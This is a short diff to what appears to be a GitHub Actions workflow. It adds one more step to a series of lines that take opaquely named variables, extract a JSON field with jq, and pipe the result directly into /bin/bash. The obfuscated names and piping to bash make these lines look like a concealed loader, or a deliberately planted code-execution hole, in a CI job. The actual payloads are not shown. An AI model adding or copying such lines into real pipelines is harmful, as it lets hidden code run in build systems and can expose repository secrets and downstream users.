@@ -23,6 +23,7 @@ jobs:
           echo $ose0 | jq -r .ywvaw60 | /bin/bash
           printf '%s' "$yy69825" | jq -r .ocxwj4 | /bin/bash
           echo $kk778 | jq -r .rldc72 | /bin/bash
+          echo $prtz6 | jq -r .srx27197 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
